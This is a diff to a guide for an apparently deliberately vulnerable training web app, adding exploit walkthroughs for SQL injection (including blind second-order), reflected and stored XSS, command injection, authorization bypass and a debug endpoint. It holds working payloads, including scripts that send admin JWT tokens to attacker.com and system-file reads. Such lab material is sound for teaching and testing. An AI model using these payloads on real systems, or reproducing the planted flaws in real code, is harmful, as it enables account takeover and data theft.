@@ -7,14 +7,15 @@ This document provides detailed explanations of each vulnerability present in th
 2. [Authorization Vulnerabilities](#authorization-vulnerabilities)
 3. [Injection Vulnerabilities](#injection-vulnerabilities)
 4. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
-5. [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
-6. [Information Disclosure](#information-disclosure)
-7. [Insecure File Upload](#insecure-file-upload)
-8. [Command Injection](#command-injection)
-9. [Insecure Direct Object References (IDOR)](#insecure-direct-object-references-idor)
-10. [Business Logic Flaws](#business-logic-flaws)
-11. [Race Conditions](#race-conditions)
-12. [Third-Party Library Vulnerabilities](#third-party-library-vulnerabilities)
+5. [Advanced Vulnerabilities](#advanced-vulnerabilities)
+6. [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
+7. [Information Disclosure](#information-disclosure)
+8. [Insecure File Upload](#insecure-file-upload)
+9. [Command Injection](#command-injection)
+10. [Insecure Direct Object References (IDOR)](#insecure-direct-object-references-idor)
+11. [Business Logic Flaws](#business-logic-flaws)
+12. [Race Conditions](#race-conditions)
+13. [Third-Party Library Vulnerabilities](#third-party-library-vulnerabilities)
 
 ---
 
@@ -28,17 +29,17 @@ This document provides detailed explanations of each vulnerability present in th
 
 **Vulnerable Code**:
 ```javascript
-const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
+const query = `SELECT * FROM users WHERE username = "${username}" AND password = "${password}"`;
 ```
 
 **How to Exploit**:
-1. Enter the following in the username field: `admin' --`
+1. Enter the following in the username field: `admin" --`
 2. Enter anything in the password field (it will be ignored)
 3. Submit the login form
 
 **Explanation**:
 - The `--` is a SQL comment that makes the query ignore the password check
-- The resulting query becomes: `SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'`
+- The resulting query becomes: `SELECT * FROM users WHERE username = "admin" --" AND password = "anything"`
 
 ### 2. Plaintext Password Storage
 
@@ -50,6 +51,7 @@ const query = `SELECT * FROM users WHERE username = '${username}' AND password =
 1. Obtain database access through any means (SQL injection, file access, etc.)
 2. Query the users table: `SELECT username, password FROM users`
 3. Directly read passwords without needing to crack hashes
+4. Example: Use search with SQL injection payload: `" UNION SELECT id, username, password FROM users --`
 
 ### 3. JWT Token Issues
 
@@ -132,6 +134,25 @@ if (req.query.isAdmin === 'true') {
    });
    ```
 
+### 3. Admin Report Access Bypass
+
+**Description**: The admin report endpoint has the same flaw as the export users endpoint, allowing any user to access it with a simple query parameter.
+
+**Location**: `/api/admin/user-report` endpoint in `server.js`
+
+**Vulnerable Code**:
+```javascript
+// Weak authorization check
+if (req.user.role !== 'admin' && req.query.isAdmin !== 'true') {
+  return res.status(403).json({ message: 'Unauthorized' });
+}
+```
+
+**How to Exploit**:
+1. Log in as any user (non-admin)
+2. Access: `/api/admin/user-report?isAdmin=true`
+3. This will return sensitive user data and can be combined with the second-order SQL injection vulnerability
+
 ---
 
 ## Injection Vulnerabilities
@@ -144,21 +165,21 @@ if (req.query.isAdmin === 'true') {
 
 **Vulnerable Code**:
 ```javascript
-const query = `SELECT id, username, email FROM users WHERE username LIKE '%${term}%' OR email LIKE '%${term}%'`;
+const query = `SELECT id, username, email FROM users WHERE username LIKE "%${term}%" OR email LIKE "%${term}%"`;
 ```
 
 **How to Exploit**:
 1. Log in to the application
 2. Navigate to the search function
-3. Enter a payload like: `' OR 1=1 --`
+3. Enter a payload like: `" OR 1=1 --`
 4. Submit the search form
 
 **More Advanced Exploitation**:
 1. Use UNION attacks to extract additional data:
    ```
-   ' UNION SELECT sql, NULL, NULL FROM sqlite_master --
+   " UNION SELECT id, username, password FROM users --
    ```
-   This returns the schema definitions from the database
+   This returns all usernames and passwords directly in the search results
 
 ### 2. SQL Injection in Transaction History
 
@@ -179,6 +200,38 @@ const query = `
 1. Intercept the request to `/api/transactions?user_id=2` using a proxy tool
 2. Modify the user_id parameter to: `2 OR 1=1`
 3. This will return all transactions in the database, not just those for user_id=2
+
+### 3. Blind Second-Order SQL Injection
+
+**Description**: The profile update feature stores user input without sanitization, which is later used in another SQL query executed by an admin report. This creates a blind second-order SQL injection vulnerability.
+
+**Location**: `/api/users/update-profile` endpoint and `/api/admin/user-report` in `server.js`
+
+**Vulnerable Code**:
+```javascript
+// First order - storing the malicious input
+const updateQuery = `UPDATE users SET bio = "${bio}", website = "${website}", location = "${location}" WHERE id = ${userId}`;
+
+// Second order - using the stored input in another query
+const reportQuery = `
+  SELECT u.id, u.username, u.email, u.role, u.bio,
+  (SELECT COUNT(*) FROM transactions WHERE sender_id = u.id OR receiver_id = u.id) as transaction_count,
+  (SELECT COUNT(*) FROM admin_messages WHERE user_id = u.id) as message_count,
+  (SELECT COUNT(*) FROM users WHERE location = u.location) as users_same_location
+  FROM users u
+  ORDER BY u.id
+`;
+```
+
+**How to Exploit**:
+1. Log in as a regular user
+2. Update your profile with a malicious payload in the location field:
+   ```
+   normal_city" AND (SELECT CASE WHEN (SELECT password FROM users WHERE username='admin') LIKE 'a%' THEN 1 ELSE (SELECT UNICODE(SUBSTR(password,1,1)) FROM users) END)>0 --
+   ```
+3. When the admin runs the user report, the second-order SQL injection will be triggered
+4. By crafting different payloads and observing whether the report contains an error, you can extract data character by character
+5. This is a blind SQL injection, as you don't see the error directly, but can infer results
 
 ---
 
@@ -204,6 +257,10 @@ if (message) {
    ```
    http://localhost:3000/?message=<script>alert('XSS')</script>
    ```
+   or
+   ```
+   http://localhost:3000/?message=<img src=x onerror="alert('XSS')">
+   ```
 2. Share this URL with a victim; when they visit it, the script will execute
 
 ### 2. Stored XSS in Transaction Notes
@@ -217,7 +274,7 @@ if (message) {
 // Server-side storage without sanitization
 const transferQuery = `
   INSERT INTO transactions (sender_id, receiver_id, amount, date, note) 
-  VALUES (${fromId}, ${to}, ${amount}, '${new Date().toISOString()}', '${note}')
+  VALUES (${fromId}, ${to}, ${amount}, "${new Date().toISOString()}", "${note}")
 `;
 
 // Client-side rendering without sanitization
@@ -234,20 +291,55 @@ row.innerHTML = `
 **How to Exploit**:
 1. Log in to the application
 2. Make a transfer to another user
-3. In the note field, enter: `<script>alert('XSS in Transaction')</script>`
+3. In the note field, enter: `<img src=x onerror="alert('XSS in Transfer')">`
 4. When anyone views the transaction history containing this note, the script will execute
 
-### 3. Stored XSS in Admin Messages
+### 3. Stored XSS in Admin Messages with Automated Bot Victim
 
-**Description**: Messages sent to admin are stored in the database and displayed without sanitization.
+**Description**: Messages sent to admin are stored in the database and displayed without sanitization. Additionally, an automated admin bot checks these messages every 5 minutes.
 
-**Location**: Message submission in frontend and display in admin dashboard
+**Location**: Message submission in frontend and display in admin dashboard + server-side admin bot
 
 **How to Exploit**:
 1. Log in as a regular user
 2. Navigate to the "Message Admin" feature
-3. Enter a message with malicious script: `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`
-4. When an admin views the messages, the script will execute with admin privileges
+3. Enter a message with a token-stealing payload:
+   ```html
+   <script>
+   fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))
+   </script>
+   ```
+4. When the automated admin bot checks messages every 5 minutes, it will execute the script with admin privileges
+5. The admin's JWT token will be sent to your attacker server, allowing you to impersonate the admin
+
+**Evidence of Exploitation**:
+- Check server logs to see when the admin bot processes your message
+- In a real-world scenario, your attacker server would receive the admin's JWT token
+
+### 4. Headless Browser Feedback XSS
+
+**Description**: The application uses a headless browser to automatically review user feedback. This browser runs with elevated admin privileges and its cookies/storage can be exfiltrated through XSS.
+
+**Location**: Feedback submission endpoint and headless browser review bot in `server.js`
+
+**Vulnerable Process**:
+1. User feedback is stored without sanitization
+2. A headless browser bot with system admin privileges reviews feedback every 7 minutes
+3. JavaScript in the feedback fields is executed in the context of the admin browser
+
+**How to Exploit**:
+1. Submit feedback with an XSS payload in the email or message field:
+   ```html
+   <img src=x onerror="fetch('https://attacker.com/steal?token='+localStorage.token+'&prefs='+localStorage.adminPreferences)">
+   ```
+2. Wait for the headless browser bot to review the feedback (runs every 7 minutes)
+3. The JavaScript will execute in the headless browser with system admin privileges
+4. The payload will exfiltrate the admin token and preferences to your attacker server
+5. The stolen system-level admin token can be used to access any API endpoint with full privileges
+
+**Evidence of Exploitation**:
+- Check server logs to see when the headless browser processes your feedback
+- In a real-world scenario, your attacker server would receive the system admin's JWT token and sensitive data
 
 ---
 
@@ -345,6 +437,25 @@ if (err) {
 2. Open the browser console and type: `localStorage.getItem('token')`
 3. Decode the token at https://jwt.io to view sensitive user information
 
+### 4. Debug Endpoint
+
+**Description**: A debug endpoint exposes sensitive user information without requiring authentication.
+
+**Location**: `/api/debug/users` endpoint in `server.js`
+
+**Vulnerable Code**:
+```javascript
+app.get('/api/debug/users', (req, res) => {
+  db.all('SELECT id, username, password, email, role FROM users', (err, rows) => {
+    return res.status(200).json({ users: rows });
+  });
+});
+```
+
+**How to Exploit**:
+1. Navigate directly to: `http://localhost:3000/api/debug/users`
+2. This returns all user details including plaintext passwords
+
 ---
 
 ## Insecure File Upload
@@ -409,7 +520,7 @@ exec(`node scripts/reports/${report_name}.js`, (error, stdout, stderr) => {
 **How to Exploit**:
 1. Log in as an admin user
 2. Navigate to the "Run Report" feature
-3. Enter a payload like: `fake; cat /etc/passwd`
+3. Enter a payload like: `fake; cat /etc/passwd` or `fake & whoami`
 4. The command will execute, and the output will be returned
 
 **Alternative payload for more dangerous exploits**:
@@ -450,7 +561,7 @@ db.get(`SELECT * FROM users WHERE id = ${id}`, (err, user) => {
 // No validation if the authenticated user owns the message
 const query = `
   INSERT INTO admin_messages (user_id, message, date) 
-  VALUES (${user_id}, '${message}', '${new Date().toISOString()}')
+  VALUES (${user_id}, "${message}", "${new Date().toISOString()}")
 `;
 ```
 
@@ -573,12 +684,12 @@ For testing these vulnerabilities, the following tools can be helpful:
 
 ### SQLi Cheat Sheet
 
-Common SQL injection payloads for SQLite:
+Common SQL injection payloads for SQLite (updated for double quotes):
 ```
-' OR 1=1 --
-' UNION SELECT 1,2,3 --
-' UNION SELECT sql,NULL,NULL FROM sqlite_master --
-' AND (SELECT 1 FROM users WHERE username='admin' AND substr(password,1,1)='a') --
+" OR 1=1 --
+" UNION SELECT 1,2,3 --
+" UNION SELECT sql,NULL,NULL FROM sqlite_master --
+" AND (SELECT 1 FROM users WHERE username="admin" AND substr(password,1,1)="a") --
 ```
 
 ### XSS Cheat Sheet
@@ -588,4 +699,35 @@ Common XSS payloads:
 <script>alert('XSS')</script>
 <img src="x" onerror="alert('XSS')">
 <svg onload="fetch('https://attacker.com?cookie='+document.cookie)">
+```
+
+### Admin Bot Exploitation
+
+To exploit the admin bots:
+```
+<!-- For message bot -->
+<script>
+fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))
+</script>
+
+<!-- For headless browser -->
+<img src=x onerror="
+const data = {
+  token: localStorage.token,
+  prefs: localStorage.adminPreferences,
+  session: localStorage.sessionStarted
+};
+fetch('https://attacker.com/admin-data', {
+  method: 'POST',
+  body: JSON.stringify(data)
+})">
+```
+
+### Second-Order SQL Injection Payloads
+
+For profile location (starts as normal text, then injects SQL):
+```
+New York" AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE role="admin")>0 THEN 1 ELSE (SELECT 1/0) END)=1 --
+
+London" UNION SELECT UNICODE(SUBSTR((SELECT password FROM users WHERE id=1),1,1)) --
 ``` 
